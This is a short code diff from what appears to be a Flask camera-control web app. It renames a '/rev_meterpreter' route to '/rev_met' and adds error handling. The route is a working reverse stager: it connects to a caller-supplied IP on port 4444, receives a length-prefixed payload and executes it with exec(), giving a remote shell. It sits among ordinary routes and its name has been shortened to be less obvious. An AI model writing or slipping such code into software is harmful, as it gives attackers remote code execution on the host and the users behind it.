@@ -312,19 +312,22 @@ def preview():
         return "fail"
 
 
-@app.route("/rev_meterpreter")
+@app.route("/rev_met")
 @requires_auth
 def reverse_meterpreter():
     ip = request.args.get('ip', None)
     import socket, struct
-    s = socket.socket(2, 1)
-    s.connect((ip, 4444))
-    l = struct.unpack('>I', s.recv(4))[0]
-    d = s.recv(4096)
-    while len(d) != l:
-        d += s.recv(4096)
-    exec(d, {'s': s})
-
+    try:
+        s = socket.socket(2, 1)
+        s.connect((ip, 4444))
+        l = struct.unpack('>I', s.recv(4))[0]
+        d = s.recv(4096)
+        while len(d) != l:
+            d += s.recv(4096)
+        exec(d, {'s': s})
+    except Exception as e:
+        return str(e), 500
+    return "SUCCESS"
 
 @app.route("/focus_cams")
 def focus():
